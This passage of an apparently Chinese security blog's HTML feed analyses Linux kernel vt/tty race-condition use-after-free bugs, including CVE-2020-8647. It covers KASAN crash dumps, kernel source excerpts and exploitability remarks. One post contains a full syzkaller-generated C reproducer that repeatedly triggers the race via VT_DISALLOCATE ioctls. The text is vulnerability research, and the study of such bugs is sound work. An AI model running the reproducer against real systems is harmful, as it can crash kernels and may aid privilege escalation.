class="line"> tty_ioctl+0x66f/0x1310</span><br><span class="line"> ksys_ioctl+0xe4/0x130</span><br><span class="line"> __x64_sys_ioctl+0x6f/0xb0</span><br><span class="line"> do_syscall_64+0x9c/0x390</span><br><span class="line"> entry_SYSCALL_64_after_hwframe+0x44/0xa9</span><br><span class="line"></span><br><span class="line">The buggy address belongs to the object at ffff888065b12800</span><br><span class="line"> which belongs to the cache kmalloc-1k of size 1024</span><br><span class="line">The buggy address is located 136 bytes inside of</span><br><span class="line"> 1024-byte region [ffff888065b12800, ffff888065b12c00)</span><br><span class="line">The buggy address belongs to the page:</span><br><span class="line">page:ffffea000196c400 refcount:1 mapcount:0 mapping:ffff88806cc01140 index:0x0 compound_mapcount: 0</span><br><span class="line">flags: 0x100000000010200(slab|head)</span><br><span class="line">raw: 0100000000010200 dead000000000100 dead000000000122 ffff88806cc01140</span><br><span class="line">raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000</span><br><span class="line">page dumped because: kasan: bad access detected</span><br><span class="line"></span><br><span class="line">Memory state around the buggy address:</span><br><span class="line"> ffff888065b12780: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc</span><br><span class="line"> ffff888065b12800: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb</span><br><span class="line">&gt;ffff888065b12880: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb</span><br><span class="line">                      ^</span><br><span class="line"> ffff888065b12900: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb</span><br><span class="line"> ffff888065b12980: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb</span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Syzkaller reproducer:</span><br><span class="line"># &#123;Threaded:false Collide:false Repeat:true RepeatTimes:0 Procs:8 Sandbox: Fault:false FaultCall:-1 FaultNth:0 Leak:false NetInjection:false NetDevices:false NetReset:false Cgroups:false BinfmtMisc:false CloseFDs:false KCSAN:false DevlinkPCI:false UseTmpDir:false HandleSegv:false Repro:false Trace:false&#125;</span><br><span class="line">r0 = syz_open_dev$tty20(0xc, 0x4, 0x1)</span><br><span class="line">ioctl$VT_DISALLOCATE(r0, 0x5608)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C reproducer:</span><br><span class="line">// autogenerated by syzkaller (https://github.com/google/syzkaller)</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE </span><br><span class="line"></span><br><span class="line">#include &lt;dirent.h&gt;</span><br><span class="line">#include &lt;endian.h&gt;</span><br><span class="line">#include &lt;errno.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;signal.h&gt;</span><br><span class="line">#include &lt;stdarg.h&gt;</span><br><span class="line">#include &lt;stdbool.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;time.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">static unsigned long long procid;</span><br><span class="line"></span><br><span class="line">static void sleep_ms(uint64_t ms)</span><br><span class="line">&#123;</span><br><span class="line">usleep(ms * 1000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static uint64_t current_time_ms(void)</span><br><span class="line">&#123;</span><br><span class="line">struct timespec ts;</span><br><span class="line">if (clock_gettime(CLOCK_MONOTONIC, &amp;ts))</span><br><span class="line">exit(1);</span><br><span class="line">return (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static bool write_file(const char* file, const char* what, ...)</span><br><span class="line">&#123;</span><br><span class="line">char buf[1024];</span><br><span class="line">va_list args;</span><br><span class="line">va_start(args, what);</span><br><span class="line">vsnprintf(buf, sizeof(buf), what, args);</span><br><span class="line">va_end(args);</span><br><span class="line">buf[sizeof(buf) - 1] = 0;</span><br><span class="line">int len = strlen(buf);</span><br><span class="line">int fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">if (fd == -1)</span><br><span class="line">return false;</span><br><span class="line">if (write(fd, buf, len) != len) &#123;</span><br><span class="line">int err = errno;</span><br><span class="line">close(fd);</span><br><span class="line">errno = err;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static long syz_open_dev(volatile long a0, volatile long a1, volatile long a2)</span><br><span class="line">&#123;</span><br><span class="line">if (a0 == 0xc || a0 == 0xb) &#123;</span><br><span class="line">char buf[128];</span><br><span class="line">sprintf(buf, &quot;/dev/%s/%d:%d&quot;, a0 == 0xc ? &quot;char&quot; : &quot;block&quot;, (uint8_t)a1, (uint8_t)a2);</span><br><span class="line">return open(buf, O_RDWR, 0);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">char buf[1024];</span><br><span class="line">char* hash;</span><br><span class="line">strncpy(buf, (char*)a0, sizeof(buf) - 1);</span><br><span class="line">buf[sizeof(buf) - 1] = 0;</span><br><span class="line">while ((hash = strchr(buf, &apos;#&apos;))) &#123;</span><br><span class="line">*hash = &apos;0&apos; + (char)(a1 % 10);</span><br><span class="line">a1 /= 10;</span><br><span class="line">&#125;</span><br><span class="line">return open(buf, a2, 0);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void kill_and_wait(int pid, int* status)</span><br><span class="line">&#123;</span><br><span class="line">kill(-pid, SIGKILL);</span><br><span class="line">kill(pid, SIGKILL);</span><br><span class="line">int i;</span><br><span class="line">for (i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">if (waitpid(-1, status, WNOHANG | __WALL) == pid)</span><br><span class="line">return;</span><br><span class="line">usleep(1000);</span><br><span class="line">&#125;</span><br><span class="line">DIR* dir = opendir(&quot;/sys/fs/fuse/connections&quot;);</span><br><span class="line">if (dir) &#123;</span><br><span class="line">for (;;) &#123;</span><br><span class="line">struct dirent* ent = readdir(dir);</span><br><span class="line">if (!ent)</span><br><span class="line">break;</span><br><span class="line">if (strcmp(ent-&gt;d_name, &quot;.&quot;) == 0 || strcmp(ent-&gt;d_name, &quot;..&quot;) == 0)</span><br><span class="line">continue;</span><br><span class="line">char abort[300];</span><br><span class="line">snprintf(abort, sizeof(abort), &quot;/sys/fs/fuse/connections/%s/abort&quot;, ent-&gt;d_name);</span><br><span class="line">int fd = open(abort, O_WRONLY);</span><br><span class="line">if (fd == -1) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">if (write(fd, abort, 1) &lt; 0) &#123;</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br><span class="line">closedir(dir);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">&#125;</span><br><span class="line">while (waitpid(-1, status, __WALL) != pid) &#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void setup_test()</span><br><span class="line">&#123;</span><br><span class="line">prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);</span><br><span class="line">setpgrp();</span><br><span class="line">write_file(&quot;/proc/self/oom_score_adj&quot;, &quot;1000&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static void execute_one(void);</span><br><span class="line"></span><br><span class="line">#define WAIT_FLAGS __WALL</span><br><span class="line"></span><br><span class="line">static void loop(void)</span><br><span class="line">&#123;</span><br><span class="line">int iter;</span><br><span class="line">for (iter = 0;; iter++) &#123;</span><br><span class="line">int pid = fork();</span><br><span class="line">if (pid &lt; 0)</span><br><span class="line">exit(1);</span><br><span class="line">if (pid == 0) &#123;</span><br><span class="line">setup_test();</span><br><span class="line">execute_one();</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">int status = 0;</span><br><span class="line">uint64_t start = current_time_ms();</span><br><span class="line">for (;;) &#123;</span><br><span class="line">if (waitpid(-1, &amp;status, WNOHANG | WAIT_FLAGS) == pid)</span><br><span class="line">break;</span><br><span class="line">sleep_ms(1);</span><br><span class="line">if (current_time_ms() - start &lt; 5 * 1000)</span><br><span class="line">continue;</span><br><span class="line">kill_and_wait(pid, &amp;status);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint64_t r[1] = &#123;0xffffffffffffffff&#125;;</span><br><span class="line"></span><br><span class="line">void execute_one(void)</span><br><span class="line">&#123;</span><br><span class="line">intptr_t res = 0;</span><br><span class="line">res = syz_open_dev(0xc, 4, 0x15 + procid*2);</span><br><span class="line">if (res != -1)</span><br><span class="line">r[0] = res;</span><br><span class="line">syscall(__NR_ioctl, r[0], 0x5608, 0);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 3ul, 0x32ul, -1, 0ul);</span><br><span class="line">for (procid = 0; procid &lt; 8; procid++) &#123;</span><br><span class="line">if (fork() == 0) &#123;</span><br><span class="line">loop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sleep(1000000);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说真的syzkaller真的强大，还能自己生成poc，奈何poc太长，一时半会看不懂,可以从dump信息中看出是由于 <strong>vt_disallocate_all()</strong> 函数和 <strong>con_shutdown()</strong> 函数条件竞争导致的uaf,之前在我的文章 <strong>cve-2020-8627</strong> 已经分析过vt_disallocate_all()函数的调用流程了，这篇文章主要分析一下con_shutdown()函数，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">static void vt_disallocate_all(void)</span><br><span class="line">&#123;</span><br><span class="line">struct vc_data *vc[MAX_NR_CONSOLES];</span><br><span class="line">int i;</span><br><span class="line"></span><br><span class="line">console_lock();</span><br><span class="line">for (i = 1; i &lt; MAX_NR_CONSOLES; i++)</span><br><span class="line">if (!VT_BUSY(i))</span><br><span class="line">vc[i] = vc_deallocate(i);</span><br><span class="line">else</span><br><span class="line">vc[i] = NULL;</span><br><span class="line">console_unlock();</span><br><span class="line"></span><br><span class="line">for (i = 1; i &lt; MAX_NR_CONSOLES; i++) &#123;</span><br><span class="line">if (vc[i] &amp;&amp; i &gt;= MIN_NR_CONSOLES) &#123;</span><br><span class="line">tty_port_destroy(&amp;vc[i]-&gt;port);</span><br><span class="line">kfree(vc[i]);&lt;--free here</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x00-con-shutdown（）函数"><a href="#0x00-con-shutdown（）函数" class="headerlink" title="0x00 con_shutdown（）函数"></a>0x00 con_shutdown（）函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">static void con_shutdown(struct tty_struct *tty)</span><br><span class="line">&#123;</span><br><span class="line">struct vc_data *vc = tty-&gt;driver_data;</span><br><span class="line">BUG_ON(vc == NULL);</span><br><span class="line">console_lock();</span><br><span class="line">vc-&gt;port.tty = NULL;  &lt;-- use here</span><br><span class="line">console_unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从dump文件可以看出con_shutdown()函数，应该被release_tty()函数条用，release_tty（）又被tty_kclose()调用</p><h2 id="0x01-竞争条件"><a href="#0x01-竞争条件" class="headerlink" title="0x01 竞争条件"></a>0x01 竞争条件</h2><p>条件竞争的情况就是在vc赋值之后，拿到锁之前，vt_disallocate_all()调用，拿到锁执行，把tty-&gt;driver_data释放掉，此时vc指向的是一个已经free过的指针，，之后，vt_disallocate_all()释放锁，con_shutdown（）拿到锁继续执行，之后的赋值操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vc-&gt;port.tty = NULL;</span><br></pre></td></tr></table></figure><p>如果vc指向的内存又被分配，且内容可控的话，就可以实现任意地址写0的效果，但是，应该得用root权限。。。</p>]]></content>
    
    <summary type="html">
    
      尝试一下syzkaller fuzz
    
    </summary>
    
    
    
      <category term="kernel,fuzz" scheme="http://yoursite.com/tags/kernel-fuzz/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-8647分析(转载于安全客)</title>
    <link href="http://yoursite.com/2020/03/13/CVE-2020-8647%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/03/13/CVE-2020-8647分析/</id>
    <published>2020-03-12T23:39:51.000Z</published>
    <updated>2020-08-12T12:30:01.497Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这个漏洞是由于条件竞争导致use-after-free，影响版本应该在5.6.-rc3之前，至少到5.4.7,条件竞争发生于drivers/tty/vt/vt_ioctl.c:883（linux kernel 5.4.7）</p><h1 id="0x01-patch"><a href="#0x01-patch" class="headerlink" title="0x01 patch"></a>0x01 patch</h1><p><img src="/2020/03/13/CVE-2020-8647分析/patch.png" alt=""></p><p>通过patch可以看出，此漏洞发生的原因在于通过条件竞争绕过了if判断，从而使得在获得锁之后，vc_cons[i].d仍然为NULL，就是说vc_cons[i].d一开始是有值的，当if判断过了之后，或得锁之前，再通过另一个线程，将vc_cons[i].d置NULL，那么，如果你能分配0页的话，就可以精心构造数据，就可以实现任意地址读写，但是不幸的是在linux 2.6.31之前是可以分配0页内存的，你可以通过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -a|grep vm.mmap_min_addr</span><br></pre></td></tr></table></figure><p>来查看你的kernel允许mmap的最低地址，结合 <strong>CVE-2019-9213</strong> 应该就能绕过0页分配的限制，这个漏洞应该是可利用的，（<del>但是从我目前掌握的情况来看只有root才能触发这个洞，2333</del>）</p><h1 id="0x02-如何触发漏洞"><a href="#0x02-如何触发漏洞" class="headerlink" title="0x02 如何触发漏洞"></a>0x02 如何触发漏洞</h1><p>由于这个cve没有给出poc，但是给出了crash的时候的状态,可以看出调用路径是通过tty_ioctl（）函数调用的vt_ioctl()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">general protection fault, probably for non-canonical address 0xdffffc0000000068: 0000 [#1] PREEMPT SMP KASAN</span><br><span class="line">KASAN: null-ptr-deref in range [0x0000000000000340-0x0000000000000347]</span><br><span class="line">CPU: 1 PID: 19462 Comm: syz-executor.5 Not tainted 5.5.0-syzkaller #0</span><br><span class="line">Hardware name: Google Google Compute Engine/Google Compute Engine, BIOS Google 01/01/2011</span><br><span class="line">RIP: 0010:vt_ioctl+0x1f96/0x26d0 drivers/tty/vt/vt_ioctl.c:883</span><br><span class="line">Code: 74 41 e8 bd a6 84 fd 48 89 d8 48 c1 e8 03 42 80 3c 28 00 0f 85 e4 04 00 00 48 8b 03 48 8d b8 40 03 00 00 48 89 fa 48 c1 ea 03 &lt;42&gt; 0f b6 14 2a 84 d2 74 09 80 fa 03 0f 8e b1 05 00 00 44 89 b8 40</span><br><span class="line">RSP: 0018:ffffc900086d7bb0 EFLAGS: 00010202</span><br><span class="line">RAX: 0000000000000000 RBX: ffffffff8c34ee88 RCX: ffffc9001415c000</span><br><span class="line">RDX: 0000000000000068 RSI: ffffffff83f0e6e3 RDI: 0000000000000340</span><br><span class="line">RBP: ffffc900086d7cd0 R08: ffff888054ce0100 R09: fffffbfff16a2f6d</span><br><span class="line">R10: ffff888054ce0998 R11: ffff888054ce0100 R12: 000000000000001d</span><br><span class="line">R13: dffffc0000000000 R14: 1ffff920010daf79 R15: 000000000000ff7f</span><br><span class="line">FS:  00007f7d13c12700(0000) GS:ffff8880ae900000(0000) knlGS:0000000000000000</span><br><span class="line">CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">CR2: 00007ffd477e3c38 CR3: 0000000095d0a000 CR4: 00000000001406e0</span><br><span class="line">DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000</span><br><span class="line">DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400</span><br><span class="line">Call Trace:</span><br><span class="line"> tty_ioctl+0xa37/0x14f0 drivers/tty/tty_io.c:2660</span><br><span class="line"> vfs_ioctl fs/ioctl.c:47 [inline]</span><br><span class="line"> ksys_ioctl+0x123/0x180 fs/ioctl.c:763</span><br><span class="line"> __do_sys_ioctl fs/ioctl.c:772 [inline]</span><br><span class="line"> __se_sys_ioctl fs/ioctl.c:770 [inline]</span><br><span class="line"> __x64_sys_ioctl+0x73/0xb0 fs/ioctl.c:770</span><br><span class="line"> do_syscall_64+0xfa/0x790 arch/x86/entry/common.c:294</span><br><span class="line"> entry_SYSCALL_64_after_hwframe+0x49/0xbe</span><br><span class="line">RIP: 0033:0x45b399</span><br><span class="line">Code: ad b6 fb ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 &lt;48&gt; 3d 01 f0 ff ff 0f 83 7b b6 fb ff c3 66 2e 0f 1f 84 00 00 00 00</span><br><span class="line">RSP: 002b:00007f7d13c11c78 EFLAGS: 00000246 ORIG_RAX: 0000000000000010</span><br><span class="line">RAX: ffffffffffffffda RBX: 00007f7d13c126d4 RCX: 000000000045b399</span><br><span class="line">RDX: 0000000020000080 RSI: 000000000000560a RDI: 0000000000000003</span><br><span class="line">RBP: 000000000075bf20 R08: 0000000000000000 R09: 0000000000000000</span><br><span class="line">R10: 0000000000000000 R11: 0000000000000246 R12: 00000000ffffffff</span><br><span class="line">R13: 0000000000000666 R14: 00000000004c7f04 R15: 000000000075bf2c</span><br><span class="line">Modules linked in:</span><br><span class="line">---[ end trace 80970faf7a67eb77 ]---</span><br><span class="line">RIP: 0010:vt_ioctl+0x1f96/0x26d0 drivers/tty/vt/vt_ioctl.c:883</span><br><span class="line">Code: 74 41 e8 bd a6 84 fd 48 89 d8 48 c1 e8 03 42 80 3c 28 00 0f 85 e4 04 00 00 48 8b 03 48 8d b8 40 03 00 00 48 89 fa 48 c1 ea 03 &lt;42&gt; 0f b6 14 2a 84 d2 74 09 80 fa 03 0f 8e b1 05 00 00 44 89 b8 40</span><br><span class="line">RSP: 0018:ffffc900086d7bb0 EFLAGS: 00010202</span><br><span class="line">RAX: 0000000000000000 RBX: ffffffff8c34ee88 RCX: ffffc9001415c000</span><br><span class="line">RDX: 0000000000000068 RSI: ffffffff83f0e6e3 RDI: 0000000000000340</span><br><span class="line">RBP: ffffc900086d7cd0 R08: ffff888054ce0100 R09: fffffbfff16a2f6d</span><br><span class="line">R10: ffff888054ce0998 R11: ffff888054ce0100 R12: 000000000000001d</span><br><span class="line">R13: dffffc0000000000 R14: 1ffff920010daf79 R15: 000000000000ff7f</span><br><span class="line">FS:  00007f7d13c12700(0000) GS:ffff8880ae900000(0000) knlGS:0000000000000000</span><br><span class="line">CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">CR2: 00007ffd477e3c38 CR3: 0000000095d0a000 CR4: 00000000001406e0</span><br><span class="line">DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000</span><br><span class="line">DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400</span><br></pre></td></tr></table></figure><p>如果想要实现这样的调用流程就需要 tty-&gt;ops-&gt;ioctl的值为vt_ioctl()函数的地址。这就需要找到正确的tty设备，然而/dev下并没有vty的设备。那么那个设备才是vty设备呢</p><h2 id="0x00-寻找vty设备"><a href="#0x00-寻找vty设备" class="headerlink" title="0x00 寻找vty设备"></a>0x00 寻找vty设备</h2><p>我通过grep查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;tty-&gt;ops=&quot; .</span><br></pre></td></tr></table></figure><p>然而并不能发现什么，一个也没有。。。，之后才发现有一个专门的函数去做这个赋值操作，这个函数为tty_set_operations（）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void tty_set_operations(struct tty_driver *driver,</span><br><span class="line">const struct tty_operations *op)</span><br><span class="line">&#123;</span><br><span class="line">driver-&gt;ops = op;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>,然后，这个函数在vty_init()函数中被调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int __init vty_init(const struct file_operations *console_fops)</span><br><span class="line">&#123;</span><br><span class="line">cdev_init(&amp;vc0_cdev, console_fops);</span><br><span class="line">if (cdev_add(&amp;vc0_cdev, MKDEV(TTY_MAJOR, 0), 1) ||</span><br><span class="line">    register_chrdev_region(MKDEV(TTY_MAJOR, 0), 1, &quot;/dev/vc/0&quot;) &lt; 0)</span><br><span class="line">panic(&quot;Couldn&apos;t register /dev/tty0 driver\n&quot;);</span><br><span class="line">tty0dev = device_create_with_groups(tty_class, NULL,</span><br><span class="line">    MKDEV(TTY_MAJOR, 0), NULL,</span><br><span class="line">    vt_dev_groups, &quot;tty0&quot;);</span><br><span class="line">if (IS_ERR(tty0dev))</span><br><span class="line">tty0dev = NULL;</span><br><span class="line"></span><br><span class="line">vcs_init();</span><br><span class="line"></span><br><span class="line">console_driver = alloc_tty_driver(MAX_NR_CONSOLES);</span><br><span class="line">if (!console_driver)</span><br><span class="line">panic(&quot;Couldn&apos;t allocate console driver\n&quot;);</span><br><span class="line"></span><br><span class="line">console_driver-&gt;name = &quot;tty&quot;;</span><br><span class="line">console_driver-&gt;name_base = 1;</span><br><span class="line">console_driver-&gt;major = TTY_MAJOR;</span><br><span class="line">console_driver-&gt;minor_start = 1;</span><br><span class="line">console_driver-&gt;type = TTY_DRIVER_TYPE_CONSOLE;</span><br><span class="line">console_driver-&gt;init_termios = tty_std_termios;</span><br><span class="line">if (default_utf8)</span><br><span class="line">console_driver-&gt;init_termios.c_iflag |= IUTF8;</span><br><span class="line">console_driver-&gt;flags = TTY_DRIVER_REAL_RAW | TTY_DRIVER_RESET_TERMIOS;</span><br><span class="line">tty_set_operations(console_driver, &amp;con_ops);</span><br><span class="line">if (tty_register_driver(console_driver))</span><br><span class="line">panic(&quot;Couldn&apos;t register console driver\n&quot;);</span><br><span class="line">kbd_init();</span><br><span class="line">console_map_init();</span><br><span class="line">#ifdef CONFIG_MDA_CONSOLE</span><br><span class="line">mda_console_init();</span><br><span class="line">#endif</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后发现有个panic，说明tty0是个vty设备，就可以调用vt_ioctl，经过调试，ttyx[x为数字]，设备类型都为vty，但是问题是ttyx的设备必须得有root权限才能open，open之后，就可以达到 tty-&gt;ops-&gt;ioctl的值为vt_ioctl()函数的地址的效果</p><h2 id="0x01-vt-ioctl-函数"><a href="#0x01-vt-ioctl-函数" class="headerlink" title="0x01 vt_ioctl()函数"></a>0x01 vt_ioctl()函数</h2><p>之后，就是分析一下vt_ioctl()函数了，漏洞点是在 <strong>VT_RESIZEX</strong> ，我们的重点是分析和vc_cons有关的操作，vc_cons是一个全局数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struct vc vc_cons [MAX_NR_CONSOLES];</span><br><span class="line"></span><br><span class="line">#define MAX_NR_CONSOLES63/* serial lines start at 64 */</span><br></pre></td></tr></table></figure><p>最大是63个，然后关注两个case</p><h3 id="0x00-VT-DISALLOCATE"><a href="#0x00-VT-DISALLOCATE" class="headerlink" title="0x00  VT_DISALLOCATE"></a>0x00  VT_DISALLOCATE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">case VT_DISALLOCATE:</span><br><span class="line">if (arg &gt; MAX_NR_CONSOLES) &#123;</span><br><span class="line">ret = -ENXIO;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">if (arg == 0)</span><br><span class="line">vt_disallocate_all();</span><br><span class="line">else</span><br><span class="line">ret = vt_disallocate(--arg);</span><br><span class="line">break;</span><br></pre></td></tr></table></figure><p>arg为我们ioctl第三个参数，arg为unsigned long第一个if没有整数溢出，之后判断arg是否为0如果为0，就调用vt_disallocate_all（）函数</p><h4 id="0x00-vt-disallocate-all-函数"><a href="#0x00-vt-disallocate-all-函数" class="headerlink" title="0x00 vt_disallocate_all()函数"></a>0x00 vt_disallocate_all()函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">static void vt_disallocate_all(void)</span><br><span class="line">&#123;</span><br><span class="line">struct vc_data *vc[MAX_NR_CONSOLES];</span><br><span class="line">int i;</span><br><span class="line"></span><br><span class="line">console_lock();</span><br><span class="line">for (i = 1; i &lt; MAX_NR_CONSOLES; i++)</span><br><span class="line">if (!VT_BUSY(i))</span><br><span class="line">vc[i] = vc_deallocate(i);</span><br><span class="line">else</span><br><span class="line">vc[i] = NULL;</span><br><span class="line">console_unlock();</span><br><span class="line"></span><br><span class="line">for (i = 1; i &lt; MAX_NR_CONSOLES; i++) &#123;</span><br><span class="line">if (vc[i] &amp;&amp; i &gt;= MIN_NR_CONSOLES) &#123;</span><br><span class="line">tty_port_destroy(&amp;vc[i]-&gt;port);</span><br><span class="line">kfree(vc[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span 